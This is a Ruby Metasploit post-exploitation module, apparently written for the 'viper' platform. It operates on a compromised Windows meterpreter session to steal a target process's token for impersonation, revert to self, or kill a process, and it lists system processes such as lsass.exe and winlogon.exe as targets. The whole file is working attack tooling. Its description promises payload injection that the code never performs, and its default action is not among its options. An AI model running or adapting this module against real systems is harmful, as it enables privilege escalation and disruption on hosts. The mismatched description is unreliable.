##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##




class MetasploitModule < Msf::Post
  Rank                  = ExcellentRanking
  DEFAULT_ADMIN_TARGETS = ['services.exe', 'svchost.exe', 'lsass.exe', 'lsm.exe', 'winlogon.exe', 'wininit.exe', 'svchost.exe',]
  DEFAULT_USER_TARGETS  = ['explorer.exe']
  include Msf::Post::Windows::Process


  def initialize(info = {})
    super(update_info(info,
                      'Name'           => 'Windows Manage Memory Payload Injection',
                      'Description'    => %q{
          This module will inject a payload into memory of a process.  If a payload
        isn't selected, then it'll default to a reverse x86 TCP meterpreter.  If the PID
        datastore option isn't specified, then it'll inject into notepad.exe instead.
      },
                      'License'        => MSF_LICENSE,
                      'Author'         =>
                              [
                                      'viper',
                              ],
                      'Platform'       => ['win'],
                      'Arch'           => [ARCH_X86, ARCH_X64],
                      'SessionTypes'   => ['meterpreter'],
                      'Targets'        => [['Windows', {}]],
                      'DefaultTarget'  => 0,
                      'DisclosureDate' => "20190323"
          ))

    register_options(
            [
                    OptInt.new('PID', [true, 'Process Identifier to inject of process to inject payload.']),
                    OptEnum.new('ACTION', [true, 'Payload trigger method', 'inject', ['kill', 'steal_token', 'rev2self']]),
            ])
  end

  # Run Method for when run command is issued
  def run
    if session.type == "shell"
      pub_json_result(false,
                      'Unsupport shell type',
                      nil,
                      self.uuid)
      return
    end

    unless session.platform == "windows"

      pub_json_result(false,
                      'do not support linux',
                      nil,
                      self.uuid)
      return
    end
    target_pid = datastore['PID']
    if datastore['ACTION'] === 'steal_token'

      begin
        usernow = session.sys.config.steal_token(target_pid)
        session.update_session_info
      rescue Rex::Post::Meterpreter::RequestError => e
        # It could raise an exception even when the token is successfully stolen,
        # so we will just log the exception and move on.
        elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
      end
      if usernow
        pub_json_result(true,
                        nil,
                        {:pid => target_pid, :user => usernow},
                        self.uuid)
        return
      else
        pub_json_result(false,
                        "fail to steal_token from target_pid",
                        {:pid => target_pid},
                        self.uuid)
        return
      end
    elsif datastore['ACTION'] === 'rev2self'
      session.sys.config.revert_to_self
      session.update_session_info
      uid = client.sys.config.getuid
      pub_json_result(true,
                      nil,
                      {:pid => target_pid, :user => uid},
                      self.uuid)
    elsif datastore['ACTION'] === 'kill'
      begin
        flag = session.sys.process.kill(target_pid)
        pub_json_result(true,
                        nil,
                        {:pid => target_pid},
                        self.uuid)
      rescue ::Exception => e
        pub_json_result(false,
                        e,
                        nil,
                        self.uuid)
      end
      return
    end
  end
end
